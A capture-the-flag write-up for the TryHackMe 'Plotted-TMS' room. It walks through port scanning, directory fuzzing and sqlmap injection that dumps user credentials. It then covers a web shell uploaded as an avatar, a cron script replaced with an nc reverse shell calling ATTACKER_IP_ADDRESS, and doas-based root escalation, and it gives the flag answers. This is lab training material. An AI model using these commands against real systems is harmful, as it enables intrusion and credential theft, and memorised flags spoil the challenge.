---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - linux
  - enumeration
  - sql-injection
---

# Plotted-TMS
![Plotted-TMS logo](logos/plotted-tms_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [Plotted-TMS](https://tryhackme.com/room/plottedtms)  

## Description
"Everything here is plotted!

Happy Hunting!

Tip: Enumeration is key!

## Enumeration
### Port Scanning
```
ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A -T4 TARGET_IP_ADDRESS
```
```
Host is up (0.018s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
|   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
|_  256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Linux 5.X|6.X|4.X (96%), Google Android 10.X|11.X|12.X (93%), Adtran embedded (92%)
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/h:adtran:424rg
Aggressive OS guesses: Linux 5.14 - 6.8 (96%), Linux 4.15 - 5.19 (96%), Linux 4.15 (95%), Linux 5.4 - 5.15 (95%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Adtran 424RG FTTH gateway (92%), Android 10 - 11 (Linux 4.9 - 4.14) (92%), Android 9 - 11 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
```

### HTTP Enumeration (80)
```bash
ffuf -u http://<TARGET_IP_ADDRESS>/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
```
**Notes**  
- No `robots.txt` or `sitemap` files  
- Nothing interesting in source code  
- `index.html` shows default Apache page  
- `ffuf` finds an `admin` directory, hosting an `id_rsa` file  
- `ffuf` also finds accessible `passwd` and `shadow` files  
- `passwd` and `shadow` files contain a `base64` string that decodes to "not this easy :D"  
- `id_rsa` file is not a standard private key file. Actually contains a `base64` string that decodes to "Trust me it is not this easy..now get back to enumeration :D"

### HTTP Enumeration (445)
```
ffuf -u http://<TARGET_IP_ADDRESS>:445/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
```
**Notes**  
- No `robots.txt` or `sitemap` files  
- Nothing interesting in source code  
- `index.html` shows default Apache page  
- `ffuf` finds a `management` page
```
ffuf -u http://<TARGET_IP_ADDRESS>:445/management/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
```
**Notes**  
- No `robots.txt` or `sitemap` files  
- Nothing interesting in source code  
- `ffuf` shows `admin` page
### Vulnerability Enumeration
```bash
searchsploit OpenSSH 8.2p1	# No results
searchsploit httpd 2.4.41	# Only result DoS
```

## Initial Foothold
**Actions**  
:white_check_mark: Attempt login to `admin` page using Burp  
:white_check_mark: Save request for use with `sqlmap`  
```bash
sqlmap -r req.txt --dbs
available databases [2]:
[*] information_schema
[*] tms_db
sqlmap -r req.txt -D tms_db --tables
Database: tms_db
[7 tables]
+---------------+
| drivers_list  |
| drivers_meta  |
| offense_items |
| offense_list  |
| offenses      |
| system_info   |
| users         |
+---------------+
sqlmap -r req.txt -D tms_db -T users --columns
Database: tms_db
Table: users
[10 columns]
+--------------+--------------+
| Column       | Type         |
+--------------+--------------+
| type         | tinyint(1)   |
| avatar       | text         |
| date_added   | datetime     |
| date_updated | datetime     |
| firstname    | varchar(250) |
| id           | int          |
| last_login   | datetime     |
| lastname     | varchar(250) |
| password     | text         |
| username     | text         |
+--------------+--------------+
sqlmap -r req.txt -D tms_db -T users -C users --dump
Database: tms_db
Table: users
[2 entries]
+----------+
| username |
+----------+
| admin    |
| puser    |
+----------+
sqlmap -r req.txt -D tms_db -T users -C password --dump
Database: tms_db                                         
Table: users
[2 entries]
+----------------------------------------------+
| password                                     |
+----------------------------------------------+
| 1254737c076cf867dc53d60a0364f38e (jsmith123) |
| 14d147dc0ba2fed434e7fd176dc87fdc             |
+----------------------------------------------+
```
**Notes**  
- Credentials discovered - `puser`:`jsmith123`  
- Account area has abiity to upload a file for avatar  

**Actions**  
:white_check_mark: Upload shell file as avatar and navigate to resulting link in `uploads` directory  
:white_check_mark: Enumerate `home` directory and search for files owned by system users  
```bash
# In web shell
ls -al /home
cat /etec/crontab # Identifies script running as plot_admin user
ls -al /var/www/scripts	# Location of plot_admin user script
drwxr-xr-x 2 www-data www-data 4096 Nov  2 21:18 .	# Write access on directory but not file itself. Remove original and replace with reverse shell
rm backup.sh	# Remove original
touch backup.sh	# Create replacement
echo '#!/bin/bash' > backup.sh	# Populate file with scripting language to use
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP_ADDRESS 8001 >/tmp/f' >> backup.sh	# Append file with reverse shell
chmod +x backup.sh	# Make file executable
# On attacker machine
nc -lvnp 8001	# Stabilise shell after successful connection
cat /home/plot_admin/user.txt
```
??? success "What is user.txt?"
	77927510d5edacea1f9e86602f1fbadb
## Privilege Escalation
```bash
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
/usr/bin/doas
cat /etc/doas.conf
permit nopass plot_admin as root cmd openssl
doas -u root openssl enc -in /root/root.txt
Congratulations on completing this room!
```
??? success "What is root.txt?"
	53f85e2da3e874426fa059040a9bdcab

**Tools Used**  
`sqlmap`

**Date completed:** 04/11/26  
**Date published:** 04/11/26